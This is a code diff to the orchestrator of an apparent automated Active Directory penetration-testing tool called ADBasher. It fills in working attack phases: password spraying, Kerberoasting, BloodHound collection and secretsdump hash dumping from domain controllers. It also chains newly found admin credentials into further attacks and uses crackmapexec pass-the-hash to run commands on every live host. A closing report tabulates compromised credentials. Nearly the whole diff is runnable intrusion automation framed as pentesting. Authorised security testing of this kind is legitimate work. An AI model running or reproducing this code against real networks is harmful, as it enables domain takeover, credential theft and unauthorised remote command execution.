@@ -7,7 +7,7 @@ from rich.console import Console
 from rich.progress import Progress
 
 from core.logger import setup_logger, get_logger
-from core.database import DatabaseManager, Target
+from core.database import DatabaseManager, Target, Credential
 
 console = Console()
 
@@ -168,25 +168,291 @@ class Orchestrator:
 
 
     def run_vuln_analysis(self):
-        # TODO: Implement Phase 2: Vuln scanning
-        time.sleep(1)
-        pass
+        """
+        Phase 2: Post-Exploitation Enumeration
+        Executes:
+        - BloodHound collection (if valid creds)
+        - Secretsdump (if admin creds)
+        """
+        self.logger.info("Starting Post-Exploitation Enumeration Phase")
+        
+        # Check for valid credentials
+        session = self.db.get_session()
+        valid_cred = session.query(Credential).filter_by(is_valid=True).first()
+        dcs = session.query(Target).filter_by(is_dc=True).all()
+        session.close()
+        
+        if not valid_cred:
+            self.logger.warning("No valid credentials found. Skipping post-exploitation.")
+            return
+        
+        if not dcs:
+            self.logger.warning("No DCs found. Skipping post-exploitation.")
+            return
+        
+        # 1. BloodHound Collection
+        bh_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '6 validcreds/automated', 'bloodhound_collect.py')
+        
+        for dc in dcs:
+            if dc.domain and valid_cred.password:
+                self.logger.info(f"Launching BloodHound collection for {dc.domain}")
+                console.print(f"[cyan]  -> BloodHound: {dc.domain}[/cyan]")
+                
+                cmd = [
+                    sys.executable,
+                    bh_script,
+                    "--session-dir", self.session_dir,
+                    "--domain", dc.domain,
+                    "--dc-ip", dc.ip_address,
+                    "--username", valid_cred.username,
+                    "--password", valid_cred.password
+                ]
+                
+                try:
+                    env = os.environ.copy()
+                    env["PYTHONPATH"] = os.getcwd() + os.pathsep + env.get("PYTHONPATH", "")
+                    subprocess.run(cmd, env=env, check=True)
+                except subprocess.CalledProcessError as e:
+                    self.logger.error(f"BloodHound collection failed: {e}")
+        
+        # 2. Secretsdump (only if admin creds available)
+        session = self.db.get_session()
+        admin_cred = session.query(Credential).filter_by(is_admin=True).first()
+        session.close()
+        
+        if admin_cred:
+            sd_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '6 validcreds/automated', 'secretsdump_auto.py')
+            
+            for dc in dcs:
+                self.logger.info(f"Launching secretsdump against {dc.ip_address}")
+                console.print(f"[cyan]  -> Secretsdump: {dc.ip_address}[/cyan]")
+                
+                cmd = [
+                    sys.executable,
+                    sd_script,
+                    "--session-dir", self.session_dir,
+                    "--target-ip", dc.ip_address,
+                    "--domain", dc.domain if dc.domain else "WORKGROUP",
+                    "--username", admin_cred.username
+                ]
+                
+                if admin_cred.password:
+                    cmd.extend(["--password", admin_cred.password])
+                elif admin_cred.ntlm_hash:
+                    cmd.extend(["--ntlm-hash", admin_cred.ntlm_hash])
+                
+                try:
+                    env = os.environ.copy()
+                    env["PYTHONPATH"] = os.getcwd() + os.pathsep + env.get("PYTHONPATH", "")
+                    subprocess.run(cmd, env=env, check=True)
+                except subprocess.CalledProcessError as e:
+                    self.logger.error(f"Secretsdump failed: {e}")
+        else:
+            self.logger.info("No admin credentials yet. Skipping secretsdump.")
 
     def run_cred_attacks(self):
-        # TODO: Implement Phase 3: Credential modules
-        time.sleep(1)
-        pass
+        """
+        Phase 3: Credential Attacks
+        Executes:
+        - Password Spraying
+        - Kerberoasting (if valid creds exist)
+        """
+        self.logger.info("Starting Credential Attack Phase")
+        
+        # Get DCs and domain info from DB
+        session = self.db.get_session()
+        dcs = session.query(Target).filter_by(is_dc=True).all()
+        session.close()
+        
+        if not dcs:
+            self.logger.warning("No DCs found. Skipping credential attacks.")
+            return
+        
+        # 1. Password Spray
+        spray_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '3 nopass/automated', 'password_spray.py')
+        
+        for dc in dcs:
+            if dc.domain:
+                self.logger.info(f"Launching password spray against {dc.domain}")
+                console.print(f"[cyan]  -> Password Spray: {dc.domain}[/cyan]")
+                
+                cmd = [
+                    sys.executable,
+                    spray_script,
+                    "--session-dir", self.session_dir,
+                    "--domain", dc.domain,
+                    "--dc-ip", dc.ip_address
+                ]
+                
+                try:
+                    env = os.environ.copy()
+                    env["PYTHONPATH"] = os.getcwd() + os.pathsep + env.get("PYTHONPATH", "")
+                    subprocess.run(cmd, env=env, check=True)
+                except subprocess.CalledProcessError as e:
+                    self.logger.error(f"Password spray failed: {e}")
+        
+        # 2. Kerberoasting (only if we have valid creds)
+        session = self.db.get_session()
+        valid_creds = session.query(Credential).filter_by(is_valid=True).first()
+        session.close()
+        
+        if valid_creds:
+            kerb_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '3 nopass/automated', 'kerberoast.py')
+            
+            for dc in dcs:
+                if dc.domain:
+                    self.logger.info(f"Launching Kerberoast against {dc.domain}")
+                    console.print(f"[cyan]  -> Kerberoast: {dc.domain}[/cyan]")
+                    
+                    cmd = [
+                        sys.executable,
+                        kerb_script,
+                        "--session-dir", self.session_dir,
+                        "--domain", dc.domain,
+                        "--dc-ip", dc.ip_address
+                    ]
+                    
+                    try:
+                        env = os.environ.copy()
+                        env["PYTHONPATH"] = os.getcwd() + os.pathsep + env.get("PYTHONPATH", "")
+                        subprocess.run(cmd, env=env, check=True)
+                    except subprocess.CalledProcessError as e:
+                        self.logger.error(f"Kerberoast failed: {e}")
+        else:
+            self.logger.info("No valid credentials yet. Skipping Kerberoast.")
+        
+        # 3. Check for Admin Privileges (Credential Cascading)
+        self.logger.info("Checking discovered credentials for admin privileges...")
+        admin_check_script = os.path.join(os.path.dirname(os.path.dirname(__file__)), '6 validcreds/automated', 'check_admin.py')
+        
+        for dc in dcs:
+            if dc.domain:
+                console.print(f"[cyan]  -> Checking Admin Privs: {dc.domain}[/cyan]")
+                
+                cmd = [
+                    sys.executable,
+                    admin_check_script,
+                    "--session-dir", self.session_dir,
+                    "--domain", dc.domain,
+                    "--dc-ip", dc.ip_address
+                ]
+                
+                try:
+                    env = os.environ.copy()
+                    env["PYTHONPATH"] = os.getcwd() + os.pathsep + env.get("PYTHONPATH", "")
+                    subprocess.run(cmd, env=env, check=True)
+                except subprocess.CalledProcessError as e:
+                    self.logger.warning(f"Admin check failed: {e}")
+        
+        # 4. Credential Cascading: If we found new admin creds, trigger post-exploitation again
+        session = self.db.get_session()
+        admin_cred = session.query(Credential).filter_by(is_admin=True).first()
+        session.close()
+        
+        if admin_cred:
+            self.logger.info("Admin credentials discovered! Re-running post-exploitation...")
+            console.print("[bold green]Admin credentials found! Triggering advanced enumeration...[/bold green]")
+            self.run_vuln_analysis()  # Recursive call for cascading
 
     def run_lateral_movement(self):
-        # TODO: Implement Phase 5: Lateral movement
-        time.sleep(1)
-        pass
+        """
+        Phase 5: Lateral Movement
+        Executes:
+        - Pass-the-Hash attacks
+        - Command execution on discovered hosts
+        """
+        self.logger.info("Starting Lateral Movement Phase")
+        
+        # Get all hosts and admin credentials
+        session = self.db.get_session()
+        admin_creds = session.query(Credential).filter_by(is_admin=True).all()
+        targets = session.query(Target).filter_by(is_alive=True).all()
+        session.close()
+        
+        if not admin_creds:
+            self.logger.warning("No admin credentials for lateral movement")
+            return
+        
+        if not targets:
+            self.logger.warning("No targets for lateral movement")
+            return
+        
+        self.logger.info(f"Attempting lateral movement to {len(targets)} hosts with {len(admin_creds)} admin creds")
+        
+        # Simple credential spraying across all hosts
+        for cred in admin_creds:
+            for target in targets:
+                console.print(f"[cyan]  -> PTH: {cred.username} @ {target.ip_address}[/cyan]")
+                
+                cmd = ["crackmapexec", "smb", target.ip_address, 
+                       "-u", cred.username, "-d", cred.domain if cred.domain else ""]
+                
+                if cred.password:
+                    cmd.extend(["-p", cred.password])
+                elif cred.ntlm_hash:
+                    cmd.extend(["-H", cred.ntlm_hash])
+                else:
+                    continue
+                
+                # Add command execution
+                cmd.extend(["-x", "whoami"])
+                
+                try:
+                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+                    if "(Pwn3d!)" in result.stdout:
+                        self.logger.info(f"[SUCCESS] Lateral movement to {target.ip_address}")
+                        # Store in LateralMovement table (TODO)
+                except Exception as e:
+                    self.logger.debug(f"Failed: {e}")
 
     def run_reporting(self):
-        # TODO: Generate final report
+        """Generate comprehensive penetration test report."""
         report_path = os.path.join(self.session_dir, "report.md")
+        
+        # Query database for results
+        session = self.db.get_session()
+        targets = session.query(Target).all()
+        credentials = session.query(Credential).all()
+        session.close()
+        
         with open(report_path, "w") as f:
-            f.write(f"# ADBasher Report - Session {self.session_id}\n")
-            f.write("## Execution Log\n")
-            f.write("Orchestration complete.\n")
+            f.write(f"# ADBasher Penetration Test Report\n")
+            f.write(f"**Session ID:** {self.session_id}\n\n")
+            f.write(f"**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
+            
+            f.write("## Executive Summary\n")
+            f.write(f"- **Targets Discovered:** {len(targets)}\n")
+            f.write(f"- **Credentials Compromised:** {len(credentials)}\n")
+            admin_count = sum(1 for c in credentials if c.is_admin)
+            f.write(f"- **Admin Credentials:** {admin_count}\n\n")
+            
+            f.write("## Discovered Targets\n")
+            f.write("| IP Address | Hostname | Domain | Type |\n")
+            f.write("|------------|----------|--------|------|\n")
+            for t in targets:
+                dc_flag = "DC" if t.is_dc else "Host"
+                f.write(f"| {t.ip_address} | {t.hostname or 'N/A'} | {t.domain or 'N/A'} | {dc_flag} |\n")
+            f.write("\n")
+            
+            f.write("## Compromised Credentials\n")
+            f.write("| Username | Domain | Type | Source | Admin |\n")
+            f.write("|----------|--------|------|--------|-------|\n")
+            for c in credentials:
+                cred_type = "Password" if c.password else "NTLM Hash"
+                admin_flag = "✓" if c.is_admin else "✗"
+                f.write(f"| {c.username} | {c.domain or 'N/A'} | {cred_type} | {c.source} | {admin_flag} |\n")
+            f.write("\n")
+            
+            f.write("## Recommendations\n")
+            f.write("1. **Password Policy:** Enforce complex passwords and MFA\n")
+            f.write("2. **Kerberoasting:** Disable or rotate service account passwords\n")
+            f.write("3. **SMB Signing:** Enable SMB signing on all hosts\n")
+            f.write("4. **LDAP Anonymous:** Disable anonymous LDAP binds\n\n")
+            
+            f.write("## Artifacts\n")
+            f.write(f"- Session logs: `{self.session_dir}/session_*.log`\n")
+            f.write(f"- BloodHound data: `{self.session_dir}/bloodhound_data/`\n")
+            f.write(f"- Database: `{self.session_dir}/session.db`\n")
+        
         self.logger.info(f"Report generated at {report_path}")
+        console.print(f"[bold green]Report saved: {report_path}[/bold green]")
